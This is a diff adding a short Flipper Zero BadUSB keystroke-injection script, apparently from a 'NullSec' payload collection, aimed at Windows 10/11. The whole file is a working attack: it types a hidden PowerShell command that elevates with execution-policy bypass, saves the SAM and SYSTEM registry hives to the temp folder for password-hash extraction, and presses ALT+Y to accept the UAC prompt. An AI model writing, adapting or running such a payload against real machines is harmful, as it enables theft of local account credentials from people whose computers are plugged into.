@@ -1,0 +1,13 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: SAM Database Dump
+REM Target: Windows 10/11 (Requires Admin)
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "reg save HKLM\SAM $env:TEMP\sam.hiv; reg save HKLM\SYSTEM $env:TEMP\system.hiv"'
+ENTER
+DELAY 2000
+ALT y
+ENTER
